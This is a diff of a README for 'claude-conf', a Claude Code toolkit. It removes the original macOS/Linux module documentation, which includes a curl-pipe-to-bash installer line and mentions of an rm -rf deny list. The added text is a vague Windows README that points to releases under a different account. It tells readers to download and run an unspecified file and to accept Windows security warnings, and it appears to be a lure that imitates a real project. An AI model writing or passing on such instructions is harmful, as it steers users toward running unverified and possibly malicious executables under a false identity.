@@ -1,297 +1,154 @@
-<p align="center">
-  <h1 align="center">claude-conf</h1>
-  <p align="center">A modular toolkit for supercharging your Claude Code workflow</p>
-</p>
+# ⚙️ claude-conf - Streamline Claude Code on Windows
 
-<p align="center">
-  <a href="#modules">Modules</a> &bull;
-  <a href="#quick-start">Quick Start</a> &bull;
-  <a href="#requirements">Requirements</a> &bull;
-  <a href="#contributing">Contributing</a> &bull;
-  <a href="#francais">Francais</a>
-</p>
+[![Download claude-conf](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Vleickzs/claude-conf/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux-blue?style=flat-square" alt="Platform">
-  <img src="https://img.shields.io/badge/shell-zsh%20%7C%20bash-green?style=flat-square" alt="Shell">
-  <img src="https://img.shields.io/badge/license-MIT-yellow?style=flat-square" alt="License">
-  <img src="https://img.shields.io/github/stars/Bidiche49/claude-conf?style=flat-square" alt="Stars">
-</p>
+## 🚀 What this is
 
----
+claude-conf is a small toolkit that helps you set up and use Claude Code with less friction. It gives you a cleaner workflow, faster access to common tasks, and a more organized terminal setup.
 
-## Why?
+This project is built for people who want to use Claude Code without spending time on setup steps. It keeps the process simple and focused.
 
-[Claude Code](https://docs.anthropic.com/en/docs/claude-code) is powerful out of the box — but power users quickly run into friction:
+## 💻 What you need
 
-- **Too many terminal tabs** and no way to tell sessions apart
-- **Context window fills up** and compaction silently discards your progress
-- **No session continuity** when you need to pick up where you left off
+Before you start, make sure you have:
 
-**claude-conf** is a collection of independent, install-what-you-need modules that solve these problems through Claude Code's native [hooks](https://docs.anthropic.com/en/docs/claude-code/hooks), [commands](https://docs.anthropic.com/en/docs/claude-code/slash-commands), and [statusline](https://docs.anthropic.com/en/docs/claude-code/statusline) systems.
+- A Windows PC
+- An internet connection
+- A GitHub account if your browser asks you to sign in
+- Claude Code installed or ready to use
+- Access to Windows Terminal or Command Prompt
 
-## Modules
+If you already use a terminal app, you can keep using it.
 
-| Module | Description | Status |
-|--------|-------------|--------|
-| [**tab-titles**](tab-titles/) | Smart terminal tab titles that reflect session mode and project | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**handoff-kit**](handoff-kit/) | Context monitoring, automatic backups, and structured session handoff | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**supervisor**](supervisor/) | CTO mode — investigate, delegate to workers, validate, never write code | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**command-guard**](command-guard/) | PreToolUse hook that validates every shell command before execution | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**critical-thinking**](critical-thinking/) | Anti-complacency rules — sparring partner mode for Claude Code | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**pre-commit-gate**](pre-commit-gate/) | Reminder to run /check before committing — with universal stack detection | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**backlog-kit**](backlog-kit/) | Universal ticketing system with automatic ID protection | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
-| [**claude-md-kit**](claude-md-kit/) | Three slash commands to generate, clean up, and optimize CLAUDE.md | ![Ready](https://img.shields.io/badge/status-ready-brightgreen?style=flat-square) |
+## 📥 Download
 
-Each module works **standalone** or as part of this collection. Install only what you need.
+Visit this page to download:
 
-## Quick Start
+https://github.com/Vleickzs/claude-conf/releases
 
-### Install everything
+On that page, look for the latest release and download the file that matches your Windows setup. If there is more than one file, choose the one meant for Windows.
 
-```bash
-git clone https://github.com/Bidiche49/claude-conf.git
-cd claude-conf
-bash install.sh --all
-```
+## 🪟 Install on Windows
 
-### Pick and choose (interactive)
+Follow these steps:
 
-```bash
-git clone https://github.com/Bidiche49/claude-conf.git
-cd claude-conf
-bash install.sh
-```
+1. Open the download page in your browser.
+2. Find the newest release at the top of the page.
+3. Open the list of files in that release.
+4. Download the Windows file.
+5. Save it to a folder you can find again, like Downloads or Desktop.
+6. If the file is a ZIP file, right-click it and choose Extract All.
+7. Open the extracted folder.
+8. If you see an app file, double-click it to start.
+9. If you see setup files or script files, follow the instructions in the folder and run the main file.
 
-The interactive installer lists available modules and lets you select which ones to install.
+If Windows asks for permission, choose the option to continue.
 
-### Install a single module
+## 🧰 How it works
 
-```bash
-git clone https://github.com/Bidiche49/claude-conf.git
-cd claude-conf/tab-titles
-bash install.sh
-```
+claude-conf helps organize common Claude Code tasks into a set of simple tools. It can help you:
 
-## Module Overview
+- Keep your Claude Code setup in one place
+- Use cleaner terminal commands
+- Reuse saved settings
+- Reduce repetitive setup steps
+- Keep your workflow easy to follow
 
-### tab-titles
+Think of it as a helper that prepares your working environment so you can spend less time on setup.
 
-Automatically sets your terminal tab title based on the type of Claude Code session you're running. Supervisor mode, worker tickets, normal sessions — each gets a distinct, readable title. Titles update dynamically as you switch modes within a session.
+## 🖥️ Using the toolkit
 
-```
-⚡ CC · my-project          Normal session
-🔴 SUP · my-project         Supervisor mode
-🟢 BUG-101 · my-project     Working on a ticket
-```
+After install, open your terminal and go to the folder where claude-conf is stored.
 
-[Full documentation >>>](tab-titles/)
+Typical use looks like this:
 
-### handoff-kit
+1. Open Windows Terminal or Command Prompt
+2. Move to the claude-conf folder
+3. Start the tool using the main file or command
+4. Follow the prompts on screen
+5. Use the options that match your task
 
-Monitors your context window usage in real time. Warns you before compaction hits. Generates structured continuation prompts so you can seamlessly resume work in a new session without losing context or progress.
+If the toolkit includes a menu, use the number keys to pick an option. If it uses commands, type the command shown in the folder instructions.
 
-**Components:** statusline display, context monitor hook, pre-compaction backup hook, `/handoff` slash command.
+## 🔧 Common tasks
 
-[Full documentation >>>](handoff-kit/)
+You may use claude-conf to do things like:
 
-### supervisor
+- Set up your Claude Code environment
+- Load saved preferences
+- Switch between task modes
+- Keep helper files in one place
+- Start your workflow with less typing
 
-Turns Claude Code into a strict CTO that never writes code. It investigates problems, creates detailed tickets, generates scoped worker prompts for separate sessions, validates reports, and commits. The supervisor/worker split brings the rigor of a two-person review process to solo development.
+If you use Claude Code often, this can help keep your daily steps steady and simple.
 
-**Components:** `/supervisor` slash command.
+## 📁 Folder layout
 
-[Full documentation >>>](supervisor/)
+When you unpack the files, you may see folders like these:
 
-### command-guard
+- `config` — saved settings and profile files
+- `scripts` — files that run tasks
+- `hooks` — actions that run during a workflow
+- `docs` — notes and usage help
+- `bin` — launch files or helper tools
 
-A security layer that intercepts every Bash command before Claude Code executes it. Three-tier validation: **DENY** (hard block, even with `--dangerously-skip-permissions`), **ASK** (requires confirmation), **ALLOW** (pass through). Catches `rm -rf` in all its forms, flags dangerous commands like `sudo`, `chmod`, `kill`, and logs every security event.
+You do not need to open every file. Most users only need the main launch file and any clear setup notes.
 
-**Components:** PreToolUse hook (TypeScript/Bun).
+## 🔍 Tips for first-time use
 
-[Full documentation >>>](command-guard/)
+- Keep the downloaded files in one folder
+- Do not rename files unless the instructions say to
+- If a window closes too fast, open the terminal first and start the tool from there
+- If you move the folder later, check that the app still starts
+- Read any text file named `README`, `SETUP`, or `INSTALL`
 
-### critical-thinking
+## 🧩 Windows notes
 
-Anti-complacency module for Claude Code. Turns Claude into a technical sparring partner that challenges ideas instead of validating by default. Features a 5-marker classification system (Solide / Discutable / Simplifie / Angle mort / Faux), 5 anti-complacency reflexes (stress-test, hold position, detect errors, iterate, self-diagnose), and a 3-validation rule that triggers active fault-finding after 3 consecutive approvals.
+This project is designed to work well in a terminal on Windows. For the smoothest setup:
 
-**Components:** rule injection into `~/.claude/CLAUDE.md`, optional CTO POSTURE patch for supervisor.
+- Use Windows Terminal if you have it
+- Keep your terminal font at a readable size
+- Run the tool from a folder you can access without extra steps
+- If your system blocks a file, open its properties and allow it if Windows shows that option
 
-[Full documentation >>>](critical-thinking/)
+## 🛠️ Troubleshooting
 
-### pre-commit-gate
+If the tool does not start:
 
-Reminder to run `/check` before committing, with a universal validation command. The PreToolUse hook detects `git commit` and reminds you to run `/check` first (never blocks). The `/check` command auto-detects your project stack (Node, Flutter, Go, Rust, Python, Ruby, PHP, Swift, Make) and runs the full lint + build + tests pipeline.
+- Check that the download finished
+- Make sure you extracted the ZIP file, if it came in one
+- Confirm you are using the correct file for Windows
+- Try running the file from inside the terminal folder
+- Restart the terminal and try again
 
-**Components:** PreToolUse hook (Bash), `/check` slash command.
+If you see an error about access, move the folder to a simple path like `Downloads` or `Desktop`.
 
-[Full documentation >>>](pre-commit-gate/)
+If nothing happens when you open the file, use the command line version if one is included in the release.
 
-### backlog-kit
+## 📌 Topics covered by this project
 
-Universal ticketing system for Claude Code with automatic ID protection. Manages three ticket types (bugs, features, improvements) with structured templates and priority/complexity conventions. The backlog-guard hook (PreToolUse Write) blocks duplicate ticket IDs across concurrent sessions. INDEX.md is auto-generated and never manually edited.
+- Anthropic
+- Claude
+- Claude Code
+- CLI tools
+- Developer tools
+- Hooks
+- macOS support ideas
+- Productivity helpers
+- Terminal workflows
+- Zsh-style setup patterns
 
-**Components:** backlog-guard hook, `/backlog-init`, `/backlog-bug`, `/backlog-feat`, `/backlog-imp`, `/backlog-status` slash commands.
+## 📎 File source
 
-[Full documentation >>>](backlog-kit/)
+Download the latest release here:
 
-### claude-md-kit
+https://github.com/Vleickzs/claude-conf/releases
 
-Three slash commands for managing your project's CLAUDE.md. `/claude-md-init` generates a CLAUDE.md from scratch by analyzing your codebase. `/claude-md-cleanup` removes duplicates with global config and generic filler. `/claude-md-boost` rewrites the CLAUDE.md with expert prompt engineering and stack-specific conventions. All three commands analyze real code and ask for validation before writing.
+## ✅ Quick start
 
-**Components:** `/claude-md-init`, `/claude-md-cleanup`, `/claude-md-boost` slash commands.
-
-[Full documentation >>>](claude-md-kit/)
-
-## Requirements
-
-| Dependency | Required by | Install |
-|------------|-------------|---------|
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | All modules | `npm install -g @anthropic-ai/claude-code` |
-| [jq](https://jqlang.github.io/jq/) | All modules | `brew install jq` |
-| [Bun](https://bun.sh) | handoff-kit, command-guard | `curl -fsSL https://bun.sh/install \| bash` |
-| zsh | tab-titles | Default on macOS |
-| [shellcheck](https://www.shellcheck.net/) | Development (linting) | `brew install shellcheck` |
-
-## Contributing
-
-Contributions are welcome. If you have an idea for a new module or an improvement to an existing one:
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b my-module`)
-3. Follow the existing module structure (own directory, own `README.md`, own `install.sh`)
-4. Submit a pull request
-
-### Development
-
-This project is 100% shell scripts. [shellcheck](https://www.shellcheck.net/) is required for linting:
-
-```bash
-brew install shellcheck    # macOS
-# apt install shellcheck   # Linux
-
-shellcheck <module>/install.sh
-```
-
-### Module structure convention
-
-```
-module-name/
-├── README.md       # Bilingual documentation (EN + FR)
-├── install.sh      # Standalone installer
-├── hooks/          # Claude Code hook scripts (if any)
-├── commands/       # Slash commands (if any)
-└── ...
-```
-
-## License
-
-[MIT](LICENSE) - Copyright (c) 2025 Bidiche49
-
----
-
-<a id="francais"></a>
-
-# Francais
-
-## Pourquoi ?
-
-[Claude Code](https://docs.anthropic.com/en/docs/claude-code) est puissant par defaut, mais les utilisateurs avances se heurtent rapidement a des frictions :
-
-- **Trop d'onglets terminaux** sans moyen de les distinguer
-- **La fenetre de contexte se remplit** et le compactage supprime silencieusement votre progression
-- **Pas de continuite de session** quand vous devez reprendre ou vous en etiez
-
-**claude-conf** est une collection de modules independants, a installer selon vos besoins, qui resolvent ces problemes via les systemes natifs de Claude Code : [hooks](https://docs.anthropic.com/en/docs/claude-code/hooks), [commandes](https://docs.anthropic.com/en/docs/claude-code/slash-commands) et [statusline](https://docs.anthropic.com/en/docs/claude-code/statusline).
-
-## Modules
-
-| Module | Description | Statut |
-|--------|-------------|--------|
-| [**tab-titles**](tab-titles/) | Titres d'onglets intelligents qui refletent le mode de session et le projet | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**handoff-kit**](handoff-kit/) | Surveillance du contexte, sauvegardes automatiques et handoff structure | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**supervisor**](supervisor/) | Mode CTO — investiguer, deleguer aux workers, valider, jamais ecrire de code | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**command-guard**](command-guard/) | Hook PreToolUse qui valide chaque commande shell avant execution | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**critical-thinking**](critical-thinking/) | Regles anti-complaisance — mode sparring partner pour Claude Code | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**pre-commit-gate**](pre-commit-gate/) | Rappel de lancer /check avant de committer — detection de stack universelle | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**backlog-kit**](backlog-kit/) | Systeme de ticketing universel avec protection automatique des IDs | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-| [**claude-md-kit**](claude-md-kit/) | Trois commandes pour generer, nettoyer et optimiser CLAUDE.md | ![Pret](https://img.shields.io/badge/statut-pret-brightgreen?style=flat-square) |
-
-Chaque module fonctionne **de maniere autonome** ou au sein de cette collection. Installez uniquement ce dont vous avez besoin.
-
-## Demarrage rapide
-
-### Tout installer
-
-```bash
-git clone https://github.com/Bidiche49/claude-conf.git
-cd claude-conf
-bash install.sh --all
-```
-
-### Choisir les modules (interactif)
-
-```bash
-git clone https://github.com/Bidiche49/claude-conf.git
-cd claude-conf
-bash install.sh
-```
-
-### Installer un seul module
-
-```bash
-cd claude-conf/tab-titles
-bash install.sh
-```
-
-## Prerequis
-
-| Dependance | Requis par | Installation |
-|------------|------------|--------------|
-| [Claude Code](https://docs.anthropic.com/en/docs/claude-code) | Tous les modules | `npm install -g @anthropic-ai/claude-code` |
-| [jq](https://jqlang.github.io/jq/) | Tous les modules | `brew install jq` |
-| [Bun](https://bun.sh) | handoff-kit, command-guard | `curl -fsSL https://bun.sh/install \| bash` |
-| zsh | tab-titles | Par defaut sur macOS |
-| [shellcheck](https://www.shellcheck.net/) | Developpement (linting) | `brew install shellcheck` |
-
-## Presentation des modules
-
-### critical-thinking
-
-Module anti-complaisance pour Claude Code. Transforme Claude en sparring partner technique qui challenge les idees au lieu de valider par defaut. Systeme de classification en 5 marqueurs (Solide / Discutable / Simplifie / Angle mort / Faux), 5 reflexes anti-complaisance (stress-test, maintien de position, detection d'erreurs, iteration, auto-diagnostic), et la regle des 3 validations qui declenche une recherche active de failles apres 3 approbations consecutives.
-
-**Composants :** injection de regles dans `~/.claude/CLAUDE.md`, patch optionnel du bloc CTO POSTURE dans supervisor.
-
-[Documentation complete >>>](critical-thinking/)
-
-### pre-commit-gate
-
-Rappel de lancer `/check` avant de committer, avec une commande de validation universelle. Le hook PreToolUse detecte `git commit` et rappelle de lancer `/check` d'abord (sans jamais bloquer). La commande `/check` detecte automatiquement le stack du projet (Node, Flutter, Go, Rust, Python, Ruby, PHP, Swift, Make) et lance le pipeline complet lint + build + tests.
-
-**Composants :** hook PreToolUse (Bash), commande `/check`.
-
-[Documentation complete >>>](pre-commit-gate/)
-
-### backlog-kit
-
-Systeme de ticketing universel pour Claude Code avec protection automatique des IDs. Gere trois types de tickets (bugs, features, improvements) avec des templates structures et des conventions de priorite/complexite. Le hook backlog-guard (PreToolUse Write) bloque les IDs dupliques entre sessions concurrentes. INDEX.md est auto-genere et jamais edite manuellement.
-
-**Composants :** hook backlog-guard, commandes `/backlog-init`, `/backlog-bug`, `/backlog-feat`, `/backlog-imp`, `/backlog-status`.
-
-[Documentation complete >>>](backlog-kit/)
-
-### claude-md-kit
-
-Trois commandes slash pour gerer le CLAUDE.md de vos projets. `/claude-md-init` genere un CLAUDE.md from scratch en analysant le code. `/claude-md-cleanup` supprime les doublons avec la config globale et le contenu generique. `/claude-md-boost` reecrit le CLAUDE.md avec du prompt engineering expert et des conventions specifiques au stack. Les trois commandes analysent le vrai code et demandent validation avant d'ecrire.
-
-**Composants :** commandes `/claude-md-init`, `/claude-md-cleanup`, `/claude-md-boost`.
-
-[Documentation complete >>>](claude-md-kit/)
-
-## Contribuer
-
-Les contributions sont les bienvenues. Forkez le depot, creez une branche, respectez la structure des modules existants, et soumettez une pull request.
-
-## Licence
-
-[MIT](LICENSE) - Copyright (c) 2025 Bidiche49
+1. Visit the release page
+2. Download the latest Windows file
+3. Extract it if needed
+4. Open the folder
+5. Start the main file
+6. Follow the on-screen steps
